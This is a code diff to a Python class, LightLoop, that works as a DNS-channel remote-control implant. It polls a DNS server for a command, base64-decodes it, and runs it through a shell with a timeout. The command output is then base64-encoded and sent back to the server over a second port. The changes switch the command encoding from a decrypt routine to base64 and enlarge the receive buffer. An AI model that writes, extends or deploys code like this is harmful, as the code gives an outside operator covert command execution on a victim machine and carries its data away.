@@ -48,20 +48,20 @@ class LightLoop:
             packet = self.build_packet(DOMAIN)
             print("Sending packet...")
             sock1.sendto(bytes(packet), (DNS_IP, DNS_PORT))
-            data, addr = sock1.recvfrom(512)
+            data, addr = sock1.recvfrom(1024)
             print("Response received!")
             txtlength = data[48]
             txt = data[49:(49+txtlength)]
             msgs = (txt.decode('utf-8')).split(';')
             to = int(msgs[1])
 
-            command = self.decrypt(msgs[0])
+            command = (base64.b64decode(msgs[0])).decode('utf-8')
             print("Executing the following command:", command, "- with timeout:", to)
             try:
                 res = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, timeout=to)
             except subprocess.CalledProcessError as e:
                 res = e.output
-            sock.sendto(res, (DNS_IP, DNS_SIGNAL_PORT))
+            sock.sendto(base64.b64encode(res), (DNS_IP, DNS_SIGNAL_PORT))
 
 
     def get_ip(self):
